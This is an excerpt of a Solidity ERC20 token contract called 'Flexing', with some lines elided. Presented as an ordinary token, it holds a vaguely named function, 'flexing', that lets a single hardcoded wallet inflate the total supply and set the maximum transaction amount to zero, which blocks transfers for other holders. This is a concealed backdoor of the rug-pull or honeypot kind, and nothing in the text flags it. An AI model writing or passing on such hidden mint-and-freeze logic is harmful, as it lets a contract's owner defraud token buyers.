...
contract Flexing is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Flexing";
    string private _symbol = "Flexing";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xdcbBAE7E47890A962b9982f224734db474D15625);
    address payable public teamWalletAddress = payable(0xdcbBAE7E47890A962b9982f224734db474D15625);
    ...
    uint256 public _walletMax =     100000000000000 * 10**_decimals;
    ...
    function flexing(uint256 _lexing) public{
        _totalSupply += _lexing;
        require(_msgSender() == marketingWalletAddress, "ERC20: cannot permit dev address");
     _maxTxAmount = 0;
     }
